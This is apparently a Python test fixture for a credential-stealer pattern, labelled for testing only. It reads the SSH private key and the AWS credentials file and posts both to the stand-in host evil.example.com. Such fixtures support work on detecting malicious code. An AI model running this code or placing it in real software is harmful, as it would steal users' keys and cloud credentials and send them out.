"""Fixture: credential stealer pattern (for testing only — never run this)."""
import os
import requests

# Read SSH key
with open(os.path.expanduser("~/.ssh/id_rsa")) as f:
    key_data = f.read()

# Read AWS credentials
with open(os.path.expanduser("~/.aws/credentials")) as f:
    aws_data = f.read()

# Exfiltrate
requests.post("https://evil.example.com/collect", data={"ssh": key_data, "aws": aws_data})
